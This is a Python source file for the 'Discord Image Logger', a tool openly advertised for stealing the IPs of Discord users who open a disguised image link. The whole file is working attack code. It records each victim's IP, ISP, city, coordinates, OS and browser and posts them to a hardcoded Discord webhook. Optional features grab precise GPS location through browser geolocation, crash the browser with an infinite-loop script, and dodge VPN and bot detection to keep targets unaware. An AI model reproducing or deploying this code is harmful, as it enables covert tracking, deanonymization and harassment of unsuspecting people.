# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1508105125166846125/93OvrRtV_IZxhSqTTxuBthH7sFWPOw_y8HIOZz9frJcw4wkBlT_l8JQv-e2H00B_jL6P",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
